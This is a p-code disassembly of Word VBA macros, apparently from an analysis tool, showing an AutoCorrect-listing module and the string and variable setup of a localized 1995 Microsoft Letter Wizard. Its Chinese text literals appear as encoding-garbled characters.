' 	SelectCase 
' Line #160:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #161:
' 	QuoteRem 0x0004 0x0009 " no error"
' Line #162:
' 	CaseElse 
' Line #163:
' 	Ld szACEntriesErrorMsg 
' 	Ld vbCr 
' 	Concat 
' 	Ld Err 
' 	MemLd Number 
' 	Concat 
' 	LitStr 0x0002 "  "
' 	Concat 
' 	Ld Err 
' 	MemLd Description 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld szName 
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #164:
' 	EndSelect 
' Line #165:
' Line #166:
' Line #167:
' 	EndFunc 
' Line #168:
' Line #169:
' 	QuoteRem 0x0000 0x0025 "****** GetAutoCorrectEntries() ******"
' Line #170:
' 	QuoteRem 0x0000 0x0000 ""
' Line #171:
' 	QuoteRem 0x0000 0x0054 " Inserts each AutoCorrect entry into a Word document including the Value and whether"
' Line #172:
' 	QuoteRem 0x0000 0x004C " or not it is to include formatting.  Name is the current name of the entry,"
' Line #173:
' 	QuoteRem 0x0000 0x0055 " Value is the text value of the entry, and RTF is a Boolean that is True if the entry"
' Line #174:
' 	QuoteRem 0x0000 0x0068 " has "formatted text" checked.  Then converts the text into a table and adds a heading row to the table."
' Line #175:
' 	QuoteRem 0x0000 0x0000 ""
' Line #176:
' 	QuoteRem 0x0000 0x0033 " x is used to loop through the AutoCorrect entries."
' Line #177:
' 	QuoteRem 0x0000 0x002C " TotalACEntries is the number of AC entries."
' Line #178:
' Line #179:
' 	FuncDefn (Private Function GetAutoCorrectEntries(id_FFFE As Variant))
' Line #180:
' 	Dim 
' 	VarDefn x (As Integer)
' Line #181:
' 	Dim 
' 	VarDefn TotalACEntries (As Integer)
' Line #182:
' Line #183:
' 	Ld Application 
' 	MemLd Autocorrect 
' 	MemLd Entries 
' 	MemLd Count 
' 	St TotalACEntries 
' Line #184:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TotalACEntries 
' 	For 
' Line #185:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #186:
' 	Ld x 
' 	Ld Application 
' 	MemLd Autocorrect 
' 	MemLd Entries 
' 	ArgsMemLd item 0x0001 
' 	MemLd New 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #187:
' 	Ld vbTab 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #188:
' Line #189:
' 	QuoteRem 0x000A 0x0035 "check for formatting and insert RTF text if necessary"
' Line #190:
' 	Ld x 
' 	Ld Application 
' 	MemLd Autocorrect 
' 	MemLd Entries 
' 	ArgsMemLd item 0x0001 
' 	MemLd RichText 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #191:
' 	Ld Selection 
' 	MemLd Range 
' 	ParamNamed Range 
' 	Ld x 
' 	Ld Application 
' 	MemLd Autocorrect 
' 	ArgsMemLd Entries 0x0001 
' 	ArgsMemCall Apply 0x0001 
' Line #192:
' 	ElseBlock 
' Line #193:
' 	Ld x 
' 	Ld Application 
' 	MemLd Autocorrect 
' 	MemLd Entries 
' 	ArgsMemLd item 0x0001 
' 	MemLd Value 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #194:
' 	EndIfBlock 
' Line #195:
' Line #196:
' 	Ld vbTab 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #197:
' 	Ld x 
' 	Ld Application 
' 	MemLd Autocorrect 
' 	MemLd Entries 
' 	ArgsMemLd item 0x0001 
' 	MemLd RichText 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #198:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #199:
' 	EndWith 
' Line #200:
' Line #201:
' 	QuoteRem 0x0004 0x0011 "update status bar"
' Line #202:
' 	QuoteRem 0x0000 0x0043 "   Application.StatusBar = StatMsg1 & X & StatMsg2 & TotalACEntries"
' Line #203:
' 	Ld StatMsg1 
' 	Ld TotalACEntries 
' 	Concat 
' 	Ld StatMsg2 
' 	Concat 
' 	Ld x 
' 	Concat 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #204:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0011 " convert to table"
' Line #208:
' 	Ld StatMsg3 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #209:
' 	Ld wdStory 
' 	ParamNamed unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #210:
' Line #211:
' 	LineCont 0x000C 0B 00 02 00 1B 00 02 00 2B 00 02 00
' 	Ld wdSeparateByTabs 
' 	ParamNamed Separator 
' 	Ld wdTableFormatSimple1 
' 	ParamNamed Format$ 
' 	LitVarSpecial (False)
' 	ParamNamed ApplyBorders 
' 	LitVarSpecial (False)
' 	ParamNamed ApplyShading 
' 	LitVarSpecial (False)
' 	ParamNamed ApplyFont 
' 	LitVarSpecial (False)
' 	ParamNamed ApplyColor 
' 	LitVarSpecial (False)
' 	ParamNamed ApplyHeadingRows 
' 	LitVarSpecial (False)
' 	ParamNamed ApplyLastRow 
' 	LitVarSpecial (False)
' 	ParamNamed ApplyFirstColumn 
' 	LitVarSpecial (False)
' 	ParamNamed ApplyLastColumn 
' 	LitVarSpecial (True)
' 	ParamNamed AutoFit 
' 	Ld Selection 
' 	ArgsMemCall ConvertToTable 0x000B 
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x0010 " add row heading"
' Line #214:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #215:
' 	Ld wdLine 
' 	ParamNamed unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	ArgsMemCallWith MoveUp 0x0002 
' Line #216:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith InsertRows 0x0001 
' Line #217:
' 	LitStr 0x0004 "Name"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #218:
' 	Ld wdCell 
' 	ParamNamed unit 
' 	ArgsMemCallWith MoveRight 0x0001 
' Line #219:
' 	LitStr 0x0005 "Value"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #220:
' 	Ld wdCell 
' 	ParamNamed unit 
' 	ArgsMemCallWith MoveRight 0x0001 
' Line #221:
' 	LitStr 0x0003 "RTF"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #222:
' 	Ld wdStory 
' 	ParamNamed unit 
' 	ArgsMemCallWith HomeKey 0x0001 
' Line #223:
' 	EndWith 
' Line #224:
' Line #225:
' 	QuoteRem 0x0001 0x0032 "Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext"
' Line #226:
' 	QuoteRem 0x0001 0x0027 "Selection.InsertBreak Type:=wdPageBreak"
' Line #227:
' Line #228:
' 	EndFunc 
' Line #229:
' Line #230:
' 	FuncDefn (Public Function SaveACDoc(id_FFFE As Variant))
' Line #231:
' 	Dim 
' 	VarDefn Style
' 	VarDefn Response (As Integer)
' Line #232:
' 	Dim 
' 	VarDefn Title (As String)
' Line #233:
' Line #234:
' 	LitVarSpecial (True)
' 	St SaveACDoc 
' Line #235:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #236:
' 	OnError SaveACDocErrors 
' Line #237:
' Line #238:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #239:
' Line #240:
' 	Label SaveACDocErrors 
' Line #241:
' 	Ld Err 
' 	MemLd Number 
' 	SelectCase 
' Line #242:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #243:
' 	QuoteRem 0x0004 0x0009 " no error"
' Line #244:
' 	LitDI2 0x1066 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #245:
' 	QuoteRem 0x0004 0x0007 " cancel"
' Line #246:
' 	LitVarSpecial (False)
' 	St SaveACDoc 
' Line #247:
' 	CaseElse 
' Line #248:
' 	Ld vbYesNo 
' 	Ld vbCritical 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0036 0x0010 " Define buttons."
' Line #249:
' Line #250:
' 	QuoteRem 0x0006 0x003D " put error number and description in title of the message box"
' Line #251:
' 	Ld Err 
' 	MemLd Number 
' 	LitStr 0x0002 "  "
' 	Concat 
' 	Ld Err 
' 	MemLd Description 
' 	Concat 
' 	St Title 
' Line #252:
' Line #253:
' 	Ld szErrorMsg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #254:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #255:
' 	Resume  
' 	QuoteRem 0x0011 0x0015 "bring up SaveAs again"
' Line #256:
' 	ElseBlock 
' 	QuoteRem 0x000E 0x0010 " User choose No."
' Line #257:
' 	LitVarSpecial (False)
' 	St SaveACDoc 
' Line #258:
' 	EndIfBlock 
' Line #259:
' 	EndSelect 
' Line #260:
' Line #261:
' 	EndFunc 
' Line #262:
' Line #263:
' Line #264:
' 	FuncDefn (Public Function OpenACDoc(ByVal ACFileOpenName As String, id_FFFE As Boolean) As Boolean)
' Line #265:
' Line #266:
' 	Dim 
' 	VarDefn Style (As Integer)
' Line #267:
' Line #268:
' 	LitVarSpecial (True)
' 	St OpenACDoc 
' Line #269:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #270:
' 	OnError OpenACDocErrors 
' Line #271:
' Line #272:
' 	Ld ACFileOpenName 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #273:
' Line #274:
' 	Label OpenACDocErrors 
' Line #275:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #276:
' 	LitVarSpecial (False)
' 	St OpenACDoc 
' Line #277:
' 	EndIfBlock 
' Line #278:
' Line #279:
' 	EndFunc 
' Line #280:
' Macros/VBA/UM01 - 94328 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0032 "**************************************************"
' Line #2:
' 	QuoteRem 0x0000 0x000E " Letter Wizard"
' Line #3:
' 	QuoteRem 0x0000 0x0012 " StartWizard Macro"
' Line #4:
' 	QuoteRem 0x0000 0x002A " %% Copyright c 1995 Microsoft Corporation"
' Line #5:
' 	QuoteRem 0x0000 0x0032 "**************************************************"
' Line #6:
' Line #7:
' 	QuoteRem 0x0000 0x001D "%% Universal DLL declarations"
' Line #8:
' 	QuoteRem 0x0000 0x0063 "Declare Function FindWindow Lib "user.exe"(lpClassName$, lpWinName$) As 'Integer Alias "FindWindow""
' Line #9:
' 	QuoteRem 0x0000 0x0086 "Declare Function WinHelp Lib "user.exe"(hWnd As Integer, lpHelpFile$, 'wCommand As Integer, dwData As Long) As Integer Alias "WinHelp""
' Line #10:
' 	FuncDefn (Private Declare Function FindWindow Lib "user32.dll" (ByVal lpClassName, ByVal lpWinName) As Long)
' Line #11:
' 	FuncDefn (Private Declare Function WinHelp Lib "user32.dll" (ByVal hwnd As Long, ByVal lpHelpFile, ByVal wCommand As Long, ByVal dwData As Long) As Long)
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0020 "%% Universal shared variables %%"
' Line #14:
' 	Dim (Public) 
' 	VarDefn State
' 	VarDefn LastState
' Line #15:
' 	Dim (Public) 
' 	VarDefn StateItems__
' Line #16:
' 	Dim (Public) 
' 	VarDefn dlg (As Object)
' Line #17:
' 	Dim (Public) 
' 	VarDefn HideFilePreview__
' Line #18:
' 	Dim (Public) 
' 	VarDefn wizname
' Line #19:
' 	Dim (Public) 
' 	VarDefn iWorkDoc
' 	VarDefn iEmptyDoc
' 	VarDefn workDoc
' 	VarDefn emptyDoc
' Line #20:
' 	Dim (Public) 
' 	VarDefn HelpCtx
' Line #21:
' 	Dim (Public) 
' 	VarDefn gDoogie
' Line #22:
' Line #23:
' 	QuoteRem 0x0000 0x0026 "%% Wizard-specific shared variables %%"
' Line #24:
' 	Dim (Public) 
' 	VarDefn LettersPath
' 	QuoteRem 0x001B 0x0032 "Path to prewritten business letters (LETTERS-PATH)"
' Line #25:
' 	Dim (Public) 
' 	VarDefn LetterMax
' 	QuoteRem 0x0013 0x0011 "Number of letters"
' Line #26:
' 	Dim (Public) 
' 	VarDefn LetterNames__
' 	QuoteRem 0x0018 0x0010 "Names of letters"
' Line #27:
' 	Dim (Public) 
' 	VarDefn LetterFiles__
' 	QuoteRem 0x001B 0x0014 "Filenames of letters"
' Line #28:
' 	Dim (Public) 
' 	VarDefn defLttr
' 	QuoteRem 0x0013 0x001B "Default category and letter"
' Line #29:
' 	Dim (Public) 
' 	VarDefn RetAddressLines
' 	QuoteRem 0x0017 0x0006 "DAPFEL"
' Line #30:
' 	Dim (Public) 
' 	VarDefn gEnvelopeLabel
' Line #31:
' 	Dim (Public) 
' 	VarDefn dlgEL (As Object)
' Line #32:
' 	Dim (Public) 
' 	VarDefn toui (As Object)
' Line #33:
' 	Dim (Public) 
' 	VarDefn gPrewrittenFile
' Line #34:
' 	Dim (Public) 
' 	VarDefn gCurrentHeadingPosition
' 	VarDefn rtDistToLftDist
' Line #35:
' 	Dim (Public) 
' 	VarDefn RetAddress__
' 	QuoteRem 0x0017 0x001C "Return Address Array (max 5)"
' Line #36:
' 	QuoteRem 0x0000 0x0011 "%% Strings galore"
' Line #37:
' 	Dim (Public) 
' 	VarDefn kThing
' 	VarDefn kUpThing
' 	VarDefn kWizname
' 	VarDefn Wizard_
' 	VarDefn Normal_
' 	VarDefn kGallery
' Line #38:
' 	Dim (Public) 
' 	VarDefn kErrBadDoc
' 	VarDefn kTip
' 	VarDefn kLetterPath
' 	VarDefn kLettersDir
' 	VarDefn kLongLettersDir
' Line #39:
' 	Dim (Public) 
' 	VarDefn kSetupDialog
' 	VarDefn kCreatingDoc
' 	VarDefn kSaveSettings
' 	VarDefn kRstSettings
' Line #40:
' 	Dim (Public) 
' 	VarDefn kRstStylsheet
' 	VarDefn kLookingForLetters
' 	VarDefn kLoadingLetterDetails
' 	VarDefn kLookingFor
' 	VarDefn kEnterRecipientAddress
' Line #41:
' 	Dim (Public) 
' 	VarDefn chQuote
' 	VarDefn kAddressATEntry
' Line #42:
' 	Dim (Public) 
' 	VarDefn Dot_
' 	VarDefn Letter_
' 	VarDefn kRE
' 	VarDefn kAccountID
' 	VarDefn kDear
' 	VarDefn kRecipient
' 	VarDefn kTypeHere
' 	VarDefn TPath
' 	VarDefn kName
' Line #43:
' 	Dim (Public) 
' 	VarDefn kClosePersonal
' 	VarDefn kCloseBusiness
' 	VarDefn kWritersInitials
' 	VarDefn kTypistsInitials
' Line #44:
' 	Dim (Public) 
' 	VarDefn kCC
' 	VarDefn kNames
' 	VarDefn kEnclosures
' 	VarDefn kNumber
' 	VarDefn kAttachments
' 	VarDefn kFormalDateFormat
' 	VarDefn kPage
' 	VarDefn kEmptyMacro
' 	VarDefn kInsertAddress
' 	VarDefn kMacroButton
' Line #45:
' 	Dim (Public) 
' 	VarDefn kErrLetterNotFound
' 	VarDefn kErrThatLetterNotFound
' Line #46:
' 	Dim (Public) 
' 	VarDefn kErrStyleNotFound1
' 	VarDefn kErrStyleNotFound2
' 	VarDefn kErrCannotCreate1
' 	VarDefn kErrCannotCreate2
' Line #47:
' 	Dim (Public) 
' 	VarDefn kTypeCompanyName
' Line #48:
' 	Dim (Public) 
' 	VarDefn kFntArial
' 	VarDefn kFntWndngs
' 	VarDefn kDfltPageNum
' Line #49:
' 	Dim (Public) 
' 	VarDefn pt90_
' 	VarDefn pt72_
' 	VarDefn pt216_
' 	VarDefn kFtrDist1
' 	VarDefn kFtrDist2
' Line #50:
' 	Dim (Public) 
' 	VarDefn kErrMaxLines
' Line #51:
' 	Dim (Public) 
' 	VarDefn cntmplet
' 	VarDefn proflett
' 	VarDefn eleglett
' Line #52:
' 	Dim (Public) 
' 	VarDefn kStyCmpnyName
' 	VarDefn kStyBodyText
' 	VarDefn kStyRetAddr
' 	VarDefn kStyCC
' 	VarDefn kStyEncl
' 	VarDefn kStySigName
' 	VarDefn kStySal
' 	VarDefn kStySubjLine
' 	VarDefn kStyDate
' 	VarDefn kStyInsideAddr
' 	VarDefn kStyRefIntls
' Line #53:
' 	Dim (Public Const) 
' 	LitStr 0x002D "Word ¦b¨Ï¥ÎªÌ½d¥»ªº³]©w¸ô®|¸Ì¡A§ä¤£¨ì¥»ºëÆF¡C"
' 	VarDefn strERR_WIZ_NOT_FOUND (As String) 0x0024
' Line #54:
' 	Dim (Public Const) 
' 	LitStr 0x0007 "Cletter"
' 	VarDefn strWizShortName
' Line #55:
' Line #56:
' 	Rem 0x0000 ""
' Line #57:
' 	Rem 0x001E " ======== InitStrings ========"
' Line #58:
' 	Rem 0x0028 " Please read LocNotes before localizing!"
' Line #59:
' 	Rem 0x0000 ""
' Line #60:
' 	FuncDefn (Private Sub InitStrings())
' Line #61:
' 	Dim 
' 	VarDefn kRstStylesheet
' Line #62:
' Line #63:
' 	Rem 0x002A " Name of wizard & document/object produced"
' Line #64:
' 	LitStr 0x0008 "­^¤å«H¥ó"
' 	St kThing$ 
' Line #65:
' 	LitStr 0x0008 "­^¤å«H¥ó"
' 	St kUpThing$ 
' Line #66:
' 	LitStr 0x000C "­^¤å«H¥óºëÆF"
' 	St kWizname$ 
' Line #67:
' 	LitStr 0x0004 "±Ò°Ê"
' 	Ld kWizname$ 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #68:
' 	Ld kWizname$ 
' 	St Wizard_$ 
' 	QuoteRem 0x0019 0x003D "Should be name as it appears in FileNew (change if different)"
' Line #69:
' 	LitStr 0x0006 "normal"
' 	St Normal_$ 
' 	QuoteRem 0x0018 0x000F "normal template"
' Line #70:
' 	LitStr 0x0007 "  Page "
' 	St kPage$ 
' Line #71:
' 	LitStr 0x000E "¦b¦¹³B¿é¤J©m¦W"
' 	St kName$ 
' Line #72:
' 	LitStr 0x000B "EmptyMacro "
' 	St kEmptyMacro$ 
' Line #73:
' 	LitStr 0x000F "Gallery Example"
' 	St kGallery$ 
' Line #74:
' 	LitStr 0x000D "InsertAddress"
' 	St kInsertAddress$ 
' 	QuoteRem 0x0026 0x0020 "Used to check if MAPI is present"
' Line #75:
' 	LitStr 0x000C "MACROBUTTON "
' 	St kMacroButton$ 
' Line #76:
' 	Rem 0x0070 " Default address stored as AT Entry. used to check if user has entered an address in prewritten business letters"
' Line #77:
' 	LitStr 0x000C "Company Name"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "Street Address"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "City, State/Province  Zip/Postal"
' 	Add 
' 	St kAddressATEntry$ 
' Line #78:
' 	LitStr 0x0017 "  ¦b¦¹³B¿é¤J¦¬¥ó¤H¦a§} "
' 	St kEnterRecipientAddress$ 
' Line #79:
' 	Rem 0x0006 " Fonts"
' Line #80:
' 	LitStr 0x0005 "Arial"
' 	St kFntArial$ 
' Line #81:
' 	LitStr 0x0009 "Wingdings"
' 	St kFntWndngs$ 
' Line #82:
' 	LitStr 0x0001 "l"
' 	St kDfltPageNum$ 
' Line #83:
' 	Rem 0x000D " Misc strings"
' Line #84:
' 	LitStr 0x0044 "ºëÆFµLªk¨Ï¥Î²{¦æ¤å¥ó¡C­Y­n°õ¦æºëÆF¡A½Ð¿ï¡uÀÉ®×¡v¡u¶}·sÀÉ®×¡v¡A¦A¿ï¨ú"
' 	Ld Wizard_$ 
' 	Add 
' 	LitStr 0x0002 "¡C"
' 	Add 
' 	St kErrBadDoc$ 
' Line #85:
' 	LitStr 0x0005 "´£¥Ü:"
' 	St kTip$ 
' Line #86:
' 	LitStr 0x000C "letters-path"
' 	St kLetterPath$ 
' 	QuoteRem 0x0022 0x001A "optional .ini file setting"
' Line #87:
' 	Rem 0x000F " Banter strings"
' Line #88:
' 	LitStr 0x0013 "¥¿¦b³]©w¹ï¸Ü¤è¶ô..."
' 	St kSetupDialog$ 
' Line #89:
' 	LitStr 0x000F "¥¿¦b«Ø¥ß¤å¥ó..."
' 	St kCreatingDoc$ 
' Line #90:
' 	LitStr 0x000F "¥¿¦bÀx¦s³]©w..."
' 	St kSaveSettings$ 
' Line #91:
' 	LitStr 0x000F "¥¿¦bÁÙ­ì³]©w..."
' 	St kRstSettings$ 
' Line #92:
' 	LitStr 0x000F "¥¿¦bÁÙ­ì¼Ë¦¡..."
' 	St kRstStylesheet$ 
' Line #93:
' 	LitStr 0x000F "¥¿¦b´M§ä«H¥ó..."
' 	St kLookingForLetters$ 
' Line #94:
' 	LitStr 0x0013 "¥¿¦b¸ü¤J«H¥ó²Ó¸`..."
' 	St kLoadingLetterDetails$ 
' Line #95:
' 	LitStr 0x0004 "´M§ä"
' 	St kLookingFor$ 
' 	QuoteRem 0x001A 0x0023 "--> 'Looking for "somefile.dot"...'"
' Line #96:
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	St chQuote$ 
' 	QuoteRem 0x0018 0x0002 " ""
' Line #97:
' 	Rem 0x000E " Style strings"
' Line #98:
' 	LitStr 0x000C "Company Name"
' 	St kStyCmpnyName$ 
' Line #99:
' 	LitStr 0x000E "Body Text Keep"
' 	St kStyBodyText$ 
' Line #100:
' 	LitStr 0x000E "Return Address"
' 	St kStyRetAddr$ 
' Line #101:
' 	LitStr 0x000E "Inside Address"
' 	St kStyInsideAddr$ 
' Line #102:
' 	LitStr 0x0002 "CC"
' 	St kStyCC$ 
' Line #103:
' 	LitStr 0x0009 "Enclosure"
' 	St kStyEncl$ 
' Line #104:
' 	LitStr 0x000E "Signature Name"
' 	St kStySigName$ 
' Line #105:
' 	LitStr 0x000A "Salutation"
' 	St kStySal$ 
' Line #106:
' 	LitStr 0x000C "Subject Line"
' 	St kStySubjLine$ 
' Line #107:
' 	LitStr 0x0004 "Date"
' 	St kStyDate$ 
' Line #108:
' 	LitStr 0x0012 "Reference Initials"
' 	St kStyRefIntls$ 
' Line #109:
' 	Rem 0x002C " == Other strings specific to this wizard =="
' Line #110:
' 	LitStr 0x0006 "letter"
' 	St Letter_$ 
' 	QuoteRem 0x0019 0x002F "Prefix for wizard stylesheets (eg, Letter1.dot)"
' Line #111:
' 	LitStr 0x0004 ".dot"
' 	St Dot_$ 
' Line #112:
' 	LitStr 0x0009 "Subject: "
' 	St kRE$ 
' Line #113:
' 	LitStr 0x0017 "¹q¤l¶l¥ó±b¸¹/¤å¥óÃÑ§O½X"
' 	St kAccountID$ 
' Line #114:
' 	LitStr 0x0005 "Dear "
' 	St kDear$ 
' Line #115:
' 	LitStr 0x0012 "¦b¦¹³B¿é¤J«H¥ó¤º®e"
' 	St kTypeHere$ 
' Line #116:
' 	LitStr 0x0018 "  ¦b¦¹³B¿é¤J¦¬¥óªÌ©m¦W  "
' 	St kRecipient$ 
' Line #117:
' 	LitStr 0x000C "Yours truly,"
' 	St kClosePersonal$ 
' Line #118:
' 	LitStr 0x000A "Sincerely,"
' 	St kCloseBusiness$ 
' Line #119:
' 	LitStr 0x001C "  ¦b¦¹³B¿é¤J±H¥óªÌ©m¦WÁY¼g  "
' 	St kWritersInitials$ 
' Line #120:
' 	LitStr 0x001C "  ¦b¦¹³B¿é¤J½sÂµªÌ©m¦WÁY¼g  "
' 	St kTypistsInitials$ 
' Line #121:
' 	LitStr 0x0004 "Cc: "
' 	St kCC$ 
' Line #122:
' 	LitStr 0x0012 "  ¦b¦¹³B¿é¤J©m¦W  "
' 	St kNames$ 
' Line #123:
' 	LitStr 0x000C "Enclosures: "
' 	St kEnclosures$ 
' Line #124:
' 	LitStr 0x0012 "  ¦b¦¹³B¿é¤J¸¹½X  "
' 	St kNumber$ 
' Line #125:
' 	LitStr 0x000B "Attachments"
' 	St kAttachments$ 
' Line #126:
' 	LitStr 0x000C "MMMM d, yyyy"
' 	St kFormalDateFormat$ 
' Line #127:
' 	Rem 0x000D " Measurements"
' Line #128:
' 	LitStr 0x0004 "90pt"
' 	St pt90_$ 
' Line #129:
' 	LitStr 0x0004 "72pt"
' 	St pt72_$ 
' Line #130:
' 	LitStr 0x0005 "216pt"
' 	St pt216_$ 
' Line #131:
' 	LitStr 0x0003 "0.5"
' 	St kFtrDist1$ 
' 	QuoteRem 0x0018 0x0015 " Used in DoStyleMerge"
' Line #132:
' 	LitStr 0x0004 "0.93"
' 	St kFtrDist2$ 
' 	QuoteRem 0x0018 0x0015 " Used in DoStyleMerge"
' Line #133:
' 	Rem 0x000F " Error messages"
' Line #134:
' 	LitStr 0x0010 "§ä¤£¨ì¹w³]«H¥ó¡C"
' 	St kErrLetterNotFound$ 
' Line #135:
' 	LitStr 0x002E "§ä¤£¨ì¹w³]«H¥ó¡C½Ð°õ¦æ¦w¸Ëµ{¦¡¨Ã¿ï¨ú«H¥ó½d¨Ò¡C"
' 	St kErrThatLetterNotFound$ 
' 	QuoteRem 0x004F 0x0037 "wizard cannot find this letter. Please choose another.""
' Line #136:
' 	LitStr 0x0010 "§ä¤£¨ì¹w³]«H¥ó¡C"
' 	St kErrLetterNotFound$ 
' Line #137:
' 	LitStr 0x0022 "ºëÆF§ä¤£¨ì¦¹«H¥ó¡A½Ð¿ï¨ú¨ä¥¦«H¥ó¡C"
' 	St kErrThatLetterNotFound$ 
' Line #138:
' 	LitStr 0x0012 "ºëÆF§ä¤£¨ì¼Ë¦¡½d¥»"
' 	St kErrStyleNotFound1$ 
' Line #139:
' 	LitStr 0x0002 "¡C"
' 	St kErrStyleNotFound2$ 
' Line #140:
' 	LitStr 0x0017 "ºëÆFµLªk«Ø¥ß«H¥ó¡A¦]¬°'"
' 	St kErrCannotCreate1$ 
' Line #141:
' 	LitStr 0x000A "' ¤£¦s¦b¡C"
' 	St kErrCannotCreate2$ 
' Line #142:
' 	LitStr 0x000C "¿é¤J¤½¥q¦WºÙ"
' 	St kTypeCompanyName$ 
' Line #143:
' 	LitStr 0x0016 "¦^«H¦a§}¤£¥i¶W¹L¤­¦æ¡C"
' 	St kErrMaxLines$ 
' Line #144:
' 	EndSub 
' 	QuoteRem 0x0008 0x000B "InitStrings"
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' 	QuoteRem 0x0000 0x0017 "%% StartWizard Macro %%"
' Line #150:
' 	FuncDefn (Public Sub Main())
' Line #151:
' 	OptionBase 
' 	LitDI2 0x000C 
' 	Redim StateItems__ 0x0001 (As Variant)
' Line #152:
' 	OptionBase 
' 	LitDI2 0x000C 
' 	Redim HideFilePreview__ 0x0001 (As Variant)
' Line #153:
' 	OptionBase 
' 	LitDI2 0x0012 
' 	Redim LetterNames__$ 0x0001 (As String)
' Line #154:
' 	OptionBase 
' 	LitDI2 0x0012 
' 	Redim LetterFiles__$ 0x0001 (As String)
' Line #155:
' 	OptionBase 
' 	LitDI2 0x0008 
' 	Redim RetAddress__$ 0x0001 (As String)
' Line #156:
' 	Dim 
' 	VarDefn p
' Line #157:
' 	Dim 
' 	VarDefn x
' Line #158:
' 	Dim 
' 	VarDefn iWindowNumber
' Line #159:
' 	Dim 
' 	VarDefn faddr (As String)
' 	VarDefn freaddr (As String)
' Line #160:
' Line #161:
' 	LitDI2 0x0000 
' 	St State 
' Line #162:
' 	LitDI2 0x0000 
' 	St LastState 
' Line #163:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd UserDialog 0x0001 
' 	Set dlg 
' Line #164:
' 	LitStr 0x0000 ""
' 	St wizname$ 
' Line #165:
' 	LitDI2 0x0000 
' 	St iWorkDoc 
' Line #166:
' 	LitDI2 0x0000 
' 	St iEmptyDoc 
' Line #167:
' 	LitStr 0x0000 ""
' 	St workDoc$ 
' Line #168:
' 	LitStr 0x0000 ""
' 	St emptyDoc$ 
' Line #169:
' 	LitDI2 0x0000 
' 	St HelpCtx 
' Line #170:
' 	LitDI2 0x0000 
' 	St gDoogie 
' Line #171:
' 	LitStr 0x0000 ""
' 	St LettersPath$ 
' Line #172:
' 	LitDI2 0x0000 
' 	St LetterMax 
' Line #173:
' 	LitDI2 0x0000 
' 	St defLttr 
' Line #174:
' 	LitDI2 0x0000 
' 	St RetAddressLines 
' Line #175:
' 	LitDI2 0x0000 
' 	St gEnvelopeLabel 
' Line #176:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsEnvelopesAndLabels 0x0001 
' 	Set dlgEL 
' Line #177:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsOptionsUserInfo 0x0001 
' 	Set toui 
' Line #178:
' 	LitStr 0x0000 ""
' 	St gPrewrittenFile$ 
' Line #179:
' 	LitDI2 0x0000 
' 	St gCurrentHeadingPosition 
' Line #180:
' 	LitDI2 0x0000 
' 	St rtDistToLftDist 
' Line #181:
' 	LitStr 0x0000 ""
' 	St kThing$ 
' Line #182:
' 	LitStr 0x0000 ""
' 	St kUpThing$ 
' Line #183:
' 	LitStr 0x0000 ""
' 	St kWizname$ 
' Line #184:
' 	LitStr 0x0000 ""
' 	St Wizard_$ 
' Line #185:
' 	LitStr 0x0000 ""
' 	St Normal_$ 
' Line #186:
' 	LitStr 0x0000 ""
